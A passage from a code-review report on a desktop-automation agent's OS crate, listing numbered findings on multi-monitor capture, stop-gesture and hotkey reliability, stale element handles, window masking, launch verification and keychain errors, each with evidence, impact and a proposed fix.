     `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = …` —
     or run `cmd /C chcp 65001 >NUL && …` for classic commands.
  3. Add `-NoLogo`.
  4. Tests: a Windows-gated unit test for the CLIXML stripper (fixture string), and a
     live check `shell("Get-Item C:\\nonexistent")` asserting the output text contains
     "Nonexistent" and no `<Objs`.

#### [OS-PER-09] Only the primary display is captured, grounded or clicked
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/perceive.rs:14-48` (`primary()`), `:57-83` (`grab_view`/`view_rect`), `crates/kai-os/src/kill.rs:107-109` (corner)
- **What:** `primary()` takes the monitor flagged primary (or the first one if none is),
  captures it, and passes its rect as the screen for grounding and for the model's
  coordinate space. Elements on other displays never become marks (they fail
  `on_screen`), and the frame never shows them. Related: on multi-monitor layouts where
  the primary display is not at (0,0) — e.g. a display to the left — the top-left
  corner gesture in `kill.rs` watches absolute `(0,0)`, which is not the display's
  corner, so the stop gesture can be unreachable or in an unexpected place.
- **Evidence:**
  ```rust
  let primary = all.iter().position(|m| m.is_primary().unwrap_or(false)).unwrap_or(0);
  all.into_iter().nth(primary).ok_or_else(|| anyhow::anyhow!("no display found"))
  ```
- **Impact:** Anyone working on a second monitor gets observations of the wrong screen
  ("Kai can't see the app", "it clicked on the other screen"), and the documented
  three-ways-to-stop gesture does not work where they expect. No onboarding text
  mentions the primary-display restriction.
- **Fix:**
  1. Capture the display that contains the focused window (`window::list()` already
     gives window rects and the focused pid): pick the monitor whose rect contains the
     focused window's centre, else the primary. Pass that monitor's rect through
     `grab`/`ground`/`ObservationSpace` (the plumbing already works for arbitrary
     origins thanks to `shifted`/`local`).
  2. When the focused window is not on the captured display, surface it: annotate the
     observation (or at least log) and tell the model in the prompt which display it is
     looking at ("screen 2 of 3").
  3. For the corner gesture, compute the corner from the display rect actually
     captured (or from the virtual-desktop origin: `x <= min_x + CORNER && y <= min_y + CORNER`)
     instead of absolute 0,0.
  4. Tests: extend `window::tests`-style pure tests for "pick the monitor of the
     focused window" and "corner of display at (-1920,0)".

#### [OS-PER-10] The corner stop fires on Kai's own pointer moves and on a parked pointer
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/kill.rs:96-109`
- **What:** `watch_corner` polls the *absolute pointer position* every 100 ms and trips
  the switch whenever `x <= 3 && y <= 3`. It cannot tell a user push from Kai's own
  input: a click or drag that the model performs into/through the top-left 3 px
  (`Cmd::Click` moves the pointer there, `Cmd::Drag` interpolates through it) trips the
  stop and reports "pointer in top-left corner" as if the user had stopped it. Second,
  a pointer that is simply *parked* in the corner when a run starts trips on the first
  poll (~100 ms) with no user gesture. Third, `input.cursor()` failing (input thread
  dead after `CleanupFailed`) is silently treated as "not in corner" forever.
- **Evidence:**
  ```rust
  if let Ok((x, y)) = input.cursor().await && in_corner(x, y) {
      kill.trip("pointer in top-left corner");
  }
  ```
- **Impact:** Runs stop with a misleading reason (and on macOS the CLI has *no* hotkey,
  so a spurious corner trip is the only stop signal the user sees). Users learn to
  distrust the stop; the tray/CLI text blames them for something they did not do.
- **Fix:**
  1. Track whether the pointer entered the corner by movement and stayed for > 150 ms
     from *outside* the corner, and ignore positions produced by Kai's own commands:
     stamp `Input` with "last move was mine" (the input thread already knows which
     `Cmd` moved the pointer — expose an `AtomicU64` generation that
     `watch_corner` reads), and require the corner position to be observed *without* an
     intervening Kai move.
  2. On run start, seed the state with the current position: a parked pointer needs a
     leave-and-return before it counts.
  3. Trip the switch (with a clear reason) when `cursor()` errors repeatedly.
  4. Tests: pure test for the enter-and-hold state machine (parked, entered by Kai,
     entered by hand) — the polling itself can stay untested.

#### [OS-PER-11] `live` is a process-global mark→element map; concurrent runs can act on the wrong handle
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/a11y/live.rs:19,39-69`; `clear()` at `:57-61` is never called outside tests
- **What:** The perceptor and actuator are separate objects, so mark→`NodeRef` lives in
  a `static Mutex<Vec<Entry>>` that *every* observation replaces and every
  `a11y::act` (any run, any Team sub-agent, MCP plus app) reads. `lookup` accepts an
  entry when mark number, bounds and role match — a weak identity test that two
  observations of the same screen satisfy trivially. With two screen lanes in one
  process (Team mode, or `kai mcp` serving while a task runs) lane A's action can be
  resolved to lane B's (newer) element, and `clear()` — the documented "forget
  everything when the screen has changed" — is never called.
- **Evidence:**
  ```rust
  static LIVE: Mutex<Vec<Entry>> = Mutex::new(Vec::new());
  ...
  live.iter().find(|e| e.el.mark == el.mark && e.el.bounds == el.bounds && e.el.role == el.role)
  ```
- **Impact:** A press can land on the wrong element (silently, with no mouse fallback),
  and stale handles survive a screen change, so `Ok(false)`-vs-`Ok(true)` reporting can
  be wrong. Today it mostly degrades to "no entry → mouse path", but the failure is
  invisible and Team screen lanes share one process.
- **Fix:**
  1. Make the map per-observation instead of global: return the picked handles from
     `ground_live` and store them on the `Observation` (or in a per-run/perception
     token the engine passes down), so `a11y_act` resolves against *its* observation.
     If that is too invasive now, key entries by an observation id and pass it through
     `Grounding`.
  2. Call `live::clear()` from the engine whenever it decides the screen changed (or
     from `DesktopPerceptor::observe` before replacing) and delete the dead-code
     smell by testing that a stale grounding never resolves.
  3. Add a test: two `remember` calls with different elements, assert `lookup` for the
     first grounding misses.

#### [OS-PER-12] Excluded (own-window) rects are computed once per run and never refreshed
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/perceive.rs:97-104` (`set_excluded`), `crates/kai-app/src/mini.rs:68-98` (the only caller, invoked once from `kai-app/src/runs.rs:167`)
- **What:** The app reports its visible windows to `DesktopPerceptor::set_excluded` exactly
  once, at run launch. If the user drags the mini window, or the main window is raised
  later to type a one-time code, the rects are stale: the mask either misses Kai's
  window (its content is photographed and sent to the model — the mini window shows the
  model's thought and the queue text) or paints a `[24,24,24]` box over a region Kai no
  longer occupies (hiding real work from the model). On macOS the exclusion of a
  *minimised* main window is the same story: `window.bounds()` keeps the last on-screen
  rect, so the model sees a permanent black rectangle where the main window used to be.
- **Evidence:**
  ```rust
  /// The app reports its visible windows here (global screen pixels).
  pub fn set_excluded(&self, rects: Vec<Rect>) { *self.excluded.lock()... = rects; }
  ```
  called once: `mini::exclude_windows(&agent, cx);` in `runs.rs::launch`.
- **Impact:** Violates README's "Kai's own windows are kept out of every screenshot" in
  the moving case, and degrades observation quality in the minimise case (a black hole
  where content should be, plus a needless `mask` cost on every frame).
- **Fix:**
  1. Recompute exclusions on window move/resize/minimise/raise: subscribe in
     `kai-app` (GPUI's `observe_window_bounds` / a bounds observer) and call
     `exclude_windows` again — or make the perceptor ask for the rects (a callback in
     `DesktopPerceptor`) at the top of each `full()`.
  2. Skip minimised/hidden windows when building `rects` (`Win.minimized` is already
     available in `window::list()`), and log when the excluded area exceeds e.g. 60 %
     of the display so a runaway mask is noticed.
  3. Add a live check: move the mini window mid-run, capture a frame, assert no pixels
     of Kai's window are in it (and that the frame is not mostly black).

#### [OS-PER-13] A `type` step whose target cannot be resolved silently types into whatever has focus
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/desktop.rs:106-112` (and `:91-128`)
- **What:** `Action::Type` clicks the target **only if `Self::point` succeeds**; when the
  target mark is missing from the grounding (or `target` is `None`) it skips the click
  and calls `type_text`, i.e. it types into the current keyboard focus with no fresh
  focus check, no password/TCC check and no approval at *that* moment. Today the engine
  happens to guard the model path (`engine/act.rs:136-139` refuses when
  `same_target` fails, and `risk::types_into_secure` in kai-core returns `false` for a
  decision that *has* a target but whose element is missing), and the schema requires a
  target for `type`. But this is the only actuator path that degrades a targeted action
  into an untargeted one, and it silently converts "the thing I meant is gone" into
  "type at focus" — the exact opposite of SAFETY.md's "a focused password field means
  the step is not run blind".
- **Evidence:**
  ```rust
  Action::Type => {
      if let Ok((x, y)) = Self::point(d, g) {   // failure is swallowed
          self.input.click(x, y, false, 1).await?;
          tokio::time::sleep(Duration::from_millis(60)).await;
      }
      self.input.type_text(d.text.as_deref().unwrap_or("")).await
  }
  ```
- **Impact:** A latent security hole that only needs one caller (a future skill runner,
  a plan-cache replay, an MCP tool, `examples/probe`) to lose its own guard, plus a
  confusing failure mode today: with a stale grounding the model's type step lands in
  an unrelated field. Also note `risk::types_into_secure` in kai-core has the same
  shape — a `Some(target)` that is not in the grounding is treated as "not a secure
  field" rather than "unknown".
- **Fix:**
  1. In `desktop.rs::act`, refuse instead of degrading: if `d.target.is_some()` and
     `Self::point` fails, return an error ("target #{n} is not on the screen any more;
     observe again"). Keep the blind path only for `target == None` (skills/cached
     plans), and there read the tree first (the core already has that policy).
  2. Harden kai-core's `types_into_secure`/`targets_secure` to fail closed: with
     `Some(t)` not in the grounding, treat it as "unknown" and require approval (or
     refuse), which also covers computer-tool targets.
  3. Tests: `desktop::tests` case "type with an unknown mark errors and does not touch
     the input thread" (a `Fake` input counting commands), and a kai-core risk test
     `{"action":"type","target":99}` into a grounding whose focused element is a
     password field → `High`/needs approval.

#### [OS-PER-14] The AT-SPI event counter can never restart, and can be permanently disabled by a bad first call
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/a11y/events.rs:25-38,76-81`, `crates/kai-os/src/a11y/mod.rs:98-108`
- **What:** `start()` sets the `STARTED: OnceLock` **before** checking for a runtime; if
  the first `ui_events()` call happens on a thread without a Tokio runtime (or the
  listener then fails/ends), `STARTED` stays set and no listener is ever started
  again — `count()` returns `None` forever, so the per-action effect label silently
  falls back to tree diff + screen hash for the whole process. There is also no
  re-registration path if the a11y bus dies and comes back (a common
  `at-spi-bus-launcher` restart), and the counter itself is never reset between runs so
  callers must diff (fine) but a long-lived process (`kai mcp`) accumulates forever.
- **Evidence:**
  ```rust
  pub fn start() {
      if STARTED.set(()).is_err() { return; }
      let Ok(rt) = tokio::runtime::Handle::try_current() else { return; };  // STARTED already set
  ```
- **Impact:** On Linux the strongest "did my action do anything?" signal can be off for a
  whole app session without any log line above `info!`, and stop/effect verification
  downgrades to heuristics. Hard to notice, hard to report.
- **Fix:**
  1. Only set `STARTED` after a runtime is found and the task is spawned (use a separate
     `AtomicBool` guard, or `STARTED.set(())` inside the spawned task).
  2. In `listen()`, on stream error/end log at `warn!` and allow a restart (clear the
     `STARTED` slot or use a generation counter consulted by `ui_events`).
  3. Reset `COUNT` at the start of each run (add `events::reset()` called from the
     engine's run setup) so long-lived processes cannot overflow or confuse diffs.
  4. Test: `events::count()` after a failed `start()` on a runtime-less thread must
     still become available once called from within a runtime (tokio test).

#### [OS-PER-15] On Wayland the global stop hotkey silently does not fire
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/kill.rs:58-93` (`install_hotkey`), `crates/kai-os/src/permissions.rs:132-151` (Wayland "Limited"), README.md:169
- **What:** `global-hotkey`'s Linux backend is X11 (`XGrabKey`). On a Wayland session the
  grab is registered against XWayland and only sees keys while an X11 window has focus;
  for native Wayland apps (the point of the session) the hotkey never fires. Nothing in
  `permissions.rs`'s Wayland "Limited" text or in the CLI/app messaging mentions that the
  hotkey is also limited — the README says `Ctrl+Alt+Esc` works "from any app".
- **Evidence:**
  ```rust
  let manager = GlobalHotKeyManager::new()?;   // X11 grab on Linux
  ```
  `permissions.rs`: Wayland only downgrades the *Mouse and keyboard* check.
- **Impact:** A Wayland user believes there are three stops; one of them (the one the
  README leads with, and the only one that works while the pointer is busy) does not
  exist. The corner gesture still works, so this is a "lost trust" bug rather than a
  runaway.
- **Fix:**
  1. Detect `XDG_SESSION_TYPE=wayland` (already done in `permissions.rs`): when the
     hotkey cannot be relied on, do not advertise it — log at `warn!`, and make the
     CLI/app say "Stop: push the pointer into the top-left corner (the global shortcut
     needs an Xorg session)".
  2. Add a fourth check row "Stop shortcut" that reports `Limited` on Wayland and links
     to the Xorg advice already in `fix`.
  3. Fix README.md's "from any app" claim with the Wayland caveat.

#### [OS-PER-16] `open_app`/`open_url` report success without any evidence anything opened
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/launch.rs:26-44,73-125` (spawn-and-forget), `crates/kai-os/src/desktop.rs:138-166` (`wait_for_change` is advisory)
- **What:** Every platform path spawns a launcher and returns `Ok(())` without checking
  an exit status (`sh -c "… &"` always yields 0 anyway; `cmd /C start` returns
  immediately; `open -a` is detached). `desktop.rs` then waits up to 10 s for the
  *window list* to change, but the result of that wait is discarded — success is
  reported even when nothing changed, and on Wayland (`shot()` returns `None`)
  `unchanged` is always false so the wait is skipped entirely.
- **Evidence:**
  ```rust
  launch::open_app(&app)?;
  crate::window::wait_for_change(&before, LAUNCH_WAIT);   // result ignored
  Ok(())
  ```
- **Impact:** `open_app("Safariii")`, a typo'd app name, a broken `.desktop` entry or a
  Mac app that refuses to launch all return "os" success; the model then believes the
  app opened and spends steps clicking a screen that will never change (README's own
  "opened it three more times" failure class, now armoured with a false success). The
  user gets no error to approve a retry on.
- **Fix:**
  1. Make `wait_for_change` return `bool` (did anything change) and use it: if false,
     return `Ok` anyway but with an informative error string — better, return `Err`
     with "nothing opened; check the app name" so the model's recovery prompt fires.
     Keep the Wayland case explicitly "cannot verify".
  2. On the non-Linux paths, capture the launcher's exit code (`open -a` and `cmd /C
     start` both exit non-zero for unknown apps) and turn a non-zero status into an
     error with the stderr text (already routed to `Stdio::null()`; capture it).
  3. Test: `open_app("no-such-app-zzz")` on each OS returns `Err` (can be a
     `#[ignore]` live test) and `desktop::tests` covers "wait_for_change false → error
     text mentions the app name".

#### [OS-PER-17] Windows press gives up after the first pattern that errors, Linux keeps trying
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/a11y/windows_act.rs:101-109` vs `crates/kai-os/src/a11y/linux_act.rs:42-48`
- **What:** `press_patterns` returns several patterns per role, but the loop returns
  `Ok(false)` on the first pattern that is *present and errors* (`Some(Err(e))`) instead
  of continuing to the next candidate. Linux's `pick_action` walks its whole preferred
  list for the first action name the element actually offers. So on Windows a transient
  `Invoke()` failure on a button that also supports `Toggle`/`ExpandCollapse` drops to
  the mouse, while the same element on Linux is retried.
- **Evidence:**
  ```rust
  Some(Err(e)) => { log::debug!("UIA {p:?} failed: {e}"); return Ok(false); }   // no next pattern
  ```
- **Impact:** Silent downgrade to coordinate clicking on Windows for elements that the
  a11y path could have handled — the documented driver-matrix guarantee ("a driver
  change cannot silently drop to the pointer") does not hold there.
- **Fix:**
  1. Distinguish "pattern not supported" (`None`) from "call failed" (`Some(Err)`):
     try the next pattern on failure but remember the error, and only fall back to the
     mouse when every candidate failed. Keep `Ok(true)` early-return on success.
  2. Log the full candidate list with outcomes at `debug!` (as `linux_act` does with
     `names`).
  3. Test: extend `windows_act`'s pure part (extract the "which pattern next" decision
     into a testable function over a `Vec<Result>`) asserting all candidates are tried.

#### [OS-PER-18] a11y actions never check that the element is still on screen or uncovered
- **Severity:** LOW
- **Location:** `crates/kai-os/src/a11y/linux_act.rs:229-236` (`usable`), `crates/kai-os/src/a11y/windows_act.rs:46-52`, `crates/kai-os/src/a11y/macos_act.rs:21-36`
- **What:** All three actors re-check liveness/enabled/secure/role before acting, but none
  compares the element's *current* bounds/visibility with what was observed, and none
  checks a cover (another window on top). `AXPress`/UIA `Invoke`/AT-SPI `do_action`
  happily activate a control behind a modal or on a hidden tab of the same window.
- **Evidence:** `linux_act::usable` checks only `Defunct`/`Showing`/`Enabled`.
- **Impact:** With a stale observation (the engine's fresh check makes this rare, but the
  fresh check compares *groundings*, both of which may be equally stale in the same
  way) an action can fire on a control the user cannot see. Low today, but it is the
  difference between "click what I showed you" and "click what exists".
- **Fix:** Compare the freshly-read extents against the grounded rect (reject when they
  differ by more than a few px), and skip when the element's window is not the
  foreground window; treat a mismatch as `Ok(false)` (mouse path) and log at `debug!`.
  Test the rect comparator on all three platforms (pure helper, like `macos_roles`).

#### [OS-PER-19] Linux reads: silent visit cap and order-dependent active-window pick
- **Severity:** LOW
- **Location:** `crates/kai-os/src/a11y/linux.rs:65-74,80-86,127-131`
- **What:** Two silent, order-dependent behaviours: (a) when several windows report
  `State::Active` (`active.0.is_none()` picks the first encountered over D-Bus child
  order), the "active window" whose title feeds the `window_title` probe is arbitrary;
  (b) `visits > MAX_VISITS` breaks the walk with only a `debug`-free `break` — no log —
  so a large page silently loses marks (and the ones kept are whatever the stack visited
  first, i.e. last children first, which is visible in the numbering for the model).
- **Evidence:**
  ```rust
  visits += 1;
  if visits > MAX_VISITS { break; }   // silent
  ```
- **Impact:** Confusing model behaviour on big pages ("the button is not in the list")
  and a `window_title` probe that can pass/fail depending on enumeration order. Both are
  debug-only-visible today, which makes live failures hard to attribute.
- **Fix:** Log at `warn!` when the cap truncates (with the count), and prefer the
  active window whose state also has `Focused`/whose app is not a panel; when several
  remain, prefer the one whose extents intersect the display's centre. Add a unit test
  for the pure selection rule (extract it to a function over `(title, active, focused,
  panel, bounds)` tuples).

#### [OS-PER-20] `settle` returns immediately when a capture fails
- **Severity:** LOW
- **Location:** `crates/kai-os/src/perceive.rs:289-302`
- **What:** `settle()` treats a failed hash (`None`) as "the screen is stable" and
  returns at once: `(_, None) => return`. On a transient capture failure (a display
  reconfiguration, a Wayland portal hiccup, an xcap error) the engine stops waiting and
  immediately observes again — the very moment the screen is most likely to be mid-change.
- **Evidence:**
  ```rust
  match (last, now) {
      (Some(a), Some(b)) if frame::same_screen(a, b) => return,
      (_, None) => return,          // capture failed → "settled"
  ```
- **Impact:** Cheap but wrong: occasional steps fire while the UI is still animating,
  producing "nothing changed" then a duplicate action. Also each failed hash wastes a
  full-display capture.
- **Fix:** Treat a failed capture as "keep waiting until the deadline" (or return after
  two consecutive failures) and log at `debug!`. Test with a perceptor whose `hash_now`
  returns `None` once then `Some` (make `hash_now` injectable or add a `settle_with`
  helper).

#### [OS-PER-21] `KAI_FRAME_MAX_PIXELS` is unvalidated while its siblings are
- **Severity:** LOW
- **Location:** `crates/kai-os/src/frame.rs:47-67`
- **What:** `KAI_FRAME_MAX_SIDE` is clamped to `256..=7680` and `KAI_JPEG_QUALITY` to
  `1..=100`, but `KAI_FRAME_MAX_PIXELS` is taken verbatim (`num(...).unwrap_or(...)`).
  A typo like `KAI_FRAME_MAX_PIXELS=1` yields a 1x1 frame (no marks, no grounding
  useful), and an absurd value silently disables the budget the whole design is tuned
  for (280 soft tokens).
- **Evidence:**
  ```rust
  max_pixels: num("KAI_FRAME_MAX_PIXELS").unwrap_or(d.max_pixels),
  ```
- **Impact:** A debugging footgun that produces screenshots the model cannot read and
  messages the trace cannot explain; the docs never mention the variable's range.
- **Fix:** Clamp like the others (`(4096..=8_000_000)` or "0 = none"), and log the
  effective `FrameConfig` once at startup (`info!`). Test: `from_env` with an
  out-of-range value falls back to the default (use `set_config`-style isolation or a
  pure `parse_frame_config(&dyn Fn(&str)->Option<String>)` helper so the test does not
  mutate the process environment).

#### [OS-PER-22] A locked or denied keychain is indistinguishable from "no key"
- **Severity:** LOW
- **Location:** `crates/kai-os/src/secrets.rs:21-35`
- **What:** `get()` maps every error that is not `NoEntry` to `None` (after logging) and
  empty strings to `None`. On macOS a locked/login-keychain prompt, a denied ACL (the
  ad-hoc signature changes every rebuild — `docs/MACOS.md:46-49` documents this for TCC
  but not for the Keychain), or a Secret-Service-less session all look like "the user
  never stored a key".
- **Evidence:**
  ```rust
  Err(e) => { log::error!("keychain read for {name} failed: {e}"); None }
  ```
- **Impact:** After a rebuild, a macOS user's key silently "disappears" and onboarding
  asks them to enter it again (or fails a connection test) with no hint that a keychain
  prompt was dismissed. Support cost with a one-line fix.
- **Fix:** Return a small enum/`Result` from `get` (`Stored`, `Missing`, `Unavailable`)
  or add `get_with_reason`, and let `kai-app`/`kai-cli` say "Kai could not read your
  keychain (locked or permission denied) — open Keychain Access or store the key
  again". Mention the ad-hoc-signature Keychain re-prompt in `docs/MACOS.md`.

#### [OS-PER-23] No "release everything" failsafe if Kai is killed mid-press
- **Severity:** LOW
- **Location:** `crates/kai-os/src/input/execute.rs:22-85`
- **What:** Held keys/buttons are released on every in-process error path (good, tested),
  and a failed *release* poisons the session (`CleanupFailed` → the input thread exits
  and drops the queue). But if the process dies between `Press` and `Release` —
  `SIGKILL`, a panic abort, a crash, the macOS ⌘Q — nothing releases the OS-level
  button/modifier. On Unix the X server usually synthesises key/mouse releases when the
  *client disconnects*, but `enigo` on Linux goes through XTEST (the test extension
  pumps events as the X server, not as a client session), so a stuck modifier is
  possible; on Windows `SendInput` state is not tied to the process at all.
- **Evidence:**
  ```rust
  let released = e.button(button, Press::Release);
  released.map_err(|_| anyhow::anyhow!(CleanupFailed))?;
  ```
- **Impact:** Rare but nasty: a user's keyboard stays shifted/alted or the mouse button
  stays down after Kai crashes, and the fix (log out) is not obvious. `SIGKILL` during
  a 5 s drag is a plausible way to reach it.
- **Fix:** Register an at-exit path that releases everything: a small `Drop` on the
  input thread's `Enigo` wrapper that calls `release_keys_when_dropped` equivalents for
  every key/button it pressed (enigo tracks `held` internally with
  `Settings::release_keys_when_dropped`), plus a `libc::signal` handler for
  SIGINT/SIGTERM that trips the kill switch (so the timeout/kill path releases the
  button) rather than letting the default handler exit immediately. Test with the
  existing `Fake` mouse: dropping the runner mid-drag must see `Release`.

#### [OS-PER-24] `crop_jpeg`/`frame::crop` are dead; `live::clear` is dead
- **Severity:** LOW
- **Location:** `crates/kai-os/src/frame.rs:201-210`, `crates/kai-os/src/perceive.rs:203-206`, `crates/kai-os/src/a11y/live.rs:56-61`
- **What:** `frame::crop` (the "zoomed second look" helper) and the
  `Observation.images.crop_jpeg` field are never populated by the OS perceptor — the
  zoom path uses `zoom::render` instead — and `live::clear()` has no non-test caller.
  `DECISIONS.md` states the crop slot exists but the loop does not request it, so this
  is a known-but-uncleaned leftover.
- **Impact:** Dead code that reads as a supported feature ("crop_jpeg: None" everywhere
  suggests it is coming), and a module doc in `live.rs` advertising a function nobody
  calls. Small maintenance cost, easy win.
- **Fix:** Either wire `crop` into the human/grid retry path it was meant for, or delete
  `frame::crop` + its test and keep `crop_jpeg` as a documented reserved field. Wire
  `live::clear()` into the observation that replaces the map (or delete it). Add a
  `#[deny(dead_code)]`-style check for the crate (clippy already warns — make CI
  `-D warnings` for `kai-os`).

#### [OS-PER-25] Capabilities restrict Back/Forward buttons on every platform for a macOS-only reason
- **Severity:** LOW
- **Location:** `crates/kai-os/src/computer.rs:6-13`
- **What:** `capabilities()` always removes `Back`/`Forward` from the button list with a
  comment about macOS; Linux/X11 `enigo` supports buttons 8/9 and Windows supports
  `XBUTTON1/2`, and `native_button` maps them. So the native tool contract under-reports
  what the hands can do everywhere because one platform is unverified.
- **Impact:** Native computer-use tool calls can never use the mouse back/forward
  buttons (`ToolError::Unsupported` before the call), even where they would work — a
  small capability regression versus the legacy `Decision` path (`MouseButton::Back` is
  mapped but unreachable through the validated API).
- **Fix:** Make the list `cfg`-dependent (`#[cfg(target_os = "macos")]` skip; else keep
  them) and add a driver-matrix entry for X11/Windows. If parity is preferred, move the
  comment into the contract docs so the reason is discoverable.

#### [OS-PER-26] Windows: only the primary taskbar is read; `IsOffscreen` is the only visibility signal
- **Severity:** LOW
- **Location:** `crates/kai-os/src/a11y/windows.rs:63-68,98`
- **What:** `Shell_TrayWnd` is the primary taskbar; `Shell_SecondaryTrayWnd` (one per
  additional monitor) is never read, so on multi-monitor Windows the model cannot see or
  click the second taskbar. Visibility comes solely from `IsOffscreen`, which some
  providers report wrongly (e.g. `false` for elements on another virtual desktop, and
  `true` transiently during animations).
- **Impact:** Minor: a missing panel and occasionally marks for things that are not
  visible (the second one is mitigated by `on_screen` and the frame). Consistency with
  Linux (which reads panels by name list) would be nice.
- **Fix:** `FindWindowW("Shell_SecondaryTrayWnd")` is not enough (one per monitor) — use
  `FindWindowExW`/`EnumWindows` with the class name and add each as a root; combine
  `IsOffscreen` with "bounds intersect the foreground window's monitor" before trusting
  it. Test with a pure predicate over `(is_offscreen, bounds, monitor)`.

#### [OS-PER-27] `permissions.rs` has no cfg fallback for non-Linux/Windows/macOS targets
- **Severity:** LOW
- **Location:** `crates/kai-os/src/permissions.rs:78-115` vs `crates/kai-os/src/a11y/mod.rs:110-113`
- **What:** `accessibility()`, `input()` and `enable_accessibility()` are defined per
  `target_os` with no `any()`-style fallback, so the crate cannot compile on another Unix
  (FreeBSD, where `xcap` and `keyring` are supported) even though `a11y::platform_read`
  and `NodeRef` were written with a `()` fallback. `lib.rs`'s doc comment also still says
  "on Linux and Windows" although macOS ships (`docs/MACOS.md`).
- **Impact:** A one-line-per-function portability wart; not user-visible today, but it
  contradicts the crate's own "compile where cheap" principle in `DECISIONS.md:13`.
- **Fix:** Add the `#[cfg(not(any(...)))]` variants returning `Status::Granted`/no-op
  (mirroring `a11y`), and update `lib.rs`'s header to name all three platforms.

#### [OS-PER-28] A D-Bus connection per notification; notification failures are invisible
- **Severity:** INFO
- **Location:** `crates/kai-os/src/notify.rs:85-114`
- **What:** `linux::notify` opens a fresh `zbus::Connection::session()` for every
  notification (a human check, a question) and drops it right after; the result is only
  logged at `info!`. On a desktop with no notification daemon each call costs up to the
  2 s `LIMIT`. macOS `osascript` spawns a process per notification.
- **Impact:** Negligible in normal use (a few notifications per run), but in a run with
  many human checks the 2 s timeouts add up and the user has no way to know notifications
  are failing.
- **Fix:** Keep one lazily-created `zbus::Connection` in a `OnceCell`, and when a
  notification fails while a human check is pending, surface one line in the UI
  ("notifications are off — watch this window").

#### [OS-PER-29] `frame::mask` is a per-pixel loop over the whole rect
- **Severity:** INFO
- **Location:** `crates/kai-os/src/frame.rs:115-128`
- **What:** Masking iterates every pixel with `put_pixel` (bounds-checked per pixel). For
  a maximised Kai window on a 4K display that is ~8 M calls per frame, inside the same
  blocking task that also downscales and JPEG-encodes.
- **Impact:** A few milliseconds per frame in a latency-sensitive path (README quotes
  65 ms p50 total overhead). Not a bug, but the mask is the one place where a
  row-slice fill (`img.as_mut()` + slice copy) would be strictly better.
- **Fix:** Replace the inner loop with a `Rgba`-premultiplied slice fill per row
  (`for row in img.rows_mut().skip(y0).take(h) { row[x0..x1].fill(pixel) }`) and add a
  benchmark in `examples/probe frames` for a full-display mask.

#### [OS-PER-30] No TODO/FIXME/HACK markers anywhere in kai-os (grep evidence)
- **Severity:** INFO
- **Location:** `crates/kai-os/src/**` (grep) — `grep -rn "TODO\|FIXME\|HACK\|XXX\|todo!\|unimplemented\|placeholder" src examples` returns only the word "placeholder" in `a11y/macos_roles.rs` (a function parameter) and `unreachable!` at `src/web/act.rs:428` (out of scope).
- **What:** There are no unfinished-code markers in the crate, so nothing to triage by
  file:line. The real "unfinished" items are documented in `DECISIONS.md` instead
  (`crop_jpeg` not wired, Wayland input, Windows cross-compile-only). Worth keeping the
  convention but adding a `# Known gaps` section to `kai-os`'s docs so the gaps found
  here (Windows field values, GUI-shell parity, PowerShell encoding) live next to the
  code rather than in a decision log.
- **Impact:** Reviewers and future contributors have to re-derive gaps; the gaps that
  only exist on non-Linux platforms are effectively invisible from Linux CI.
- **Fix:** Add a short "Platform parity" checklist to `docs/HARNESS.md` (or a new
  `docs/PLATFORM.md`) enumerating every behaviour that is implemented per OS
  (tree read, field values, a11y actions, GUI launch, shell encoding, kill switch,
  exclusions) with a tick per platform, and reference it from `Cargo.toml`/`lib.rs`.

### Not needed / remove

- `crates/kai-os/src/frame.rs:201-210` `frame::crop` (+ its test at `:358-362`) is
  superseded by `zoom::render`; nothing calls it. Delete or wire it (OS-PER-24).
- `crates/kai-os/src/a11y/live.rs:56-61` `live::clear()` — no non-test caller. Either
  call it from the observation that replaces the map, or drop it.
- `crates/kai-os/src/computer.rs:50-57` builds a `ToolRequest`, validates it, and then
  ignores it (the real action is the `action` argument) — remove the unused binding to
  avoid the impression that the request is what runs.
- `crates/kai-os/src/launch.rs` `linux::program()`-based `is_gui_command` scans every
  `.desktop` file on every call (`all_entries()` re-reads the filesystem per invocation,
  and `find_desktop_entry` does it again). Not dead, but it should be memoised once per
  process (a `OnceLock<Vec<DesktopEntry>>`, invalidated on demand) — with the current
  code a single shell step can stat the whole applications tree twice.
- `crates/kai-os/src/perceive.rs:106-116` `hash_now` is only used by `settle`; if
  `settle` moves to a per-observation hash this becomes redundant — worth folding the
  two hash sources (`grab().dhash` vs `full()`'s `content_hash`) into one helper so
  there is a single "screen changed" notion in kai-os.

### What's good

- **Retina/point scaling done once, in the right place.** `frame::to_display` plus
  `grab`'s `at` rect means marks, clicks and tree agree on macOS; the mapping is
  unit-tested (`retina_capture_maps_to_display_points`) and the reasoning is documented
  in `docs/MACOS.md:56-63`. `zoom::plan`/`render` and `perceive::shifted/local` keep
  global↔image conversions in two tiny pure helpers (`perceive.rs:118-144`).
- **The accessibility-first contract is genuinely conservative.** `live::plan` refuses
  to touch secure/disabled elements, list items and cells; `linux_act::fill` requires an
  empty, editable, non-secure field with a toolkit allowlist, verifies by reading back,
  *undoes* a partial edit before handing over to the keyboard (`linux_act.rs:206-215`),
  and escalates a timed-out action to an error so the step is never done twice
  (`linux_act.rs:97`). The same "no double action" stance shows in `execute.rs`
  (`CleanupFailed` → the input thread stops accepting work).
- **Deterministic, tested Set-of-Marks.** Reading-order grouping, duplicate collapse
  (with `focused`/`secure` merged into the surviving mark), the 150-mark cap, the
  sub-4px/off-screen filters and grid fallback are all covered by `a11y/mod.rs` tests,
  and the crowd-aware tag placement (`marks.rs:43-54`, with the live-regression comment
  about "Find and Replace") is exactly the kind of fix that usually never gets written
  down.
- **Honest, bounded OS reads.** `READ_BUDGET`/`MESSAGING_TIMEOUT`/`MAX_NODES`/
  `MAX_DEPTH`/`MAX_VISITS`/`MAX_MANAGED_CHILDREN` keep a hung app or a 2^34-cell
  spreadsheet from stalling a step, and each platform's unsafe block carries a SAFETY
  comment that matches the real precondition (e.g. `macos.rs:56-60` on AX thread
  safety, `shell.rs:110` on `kill(-pgid)`).
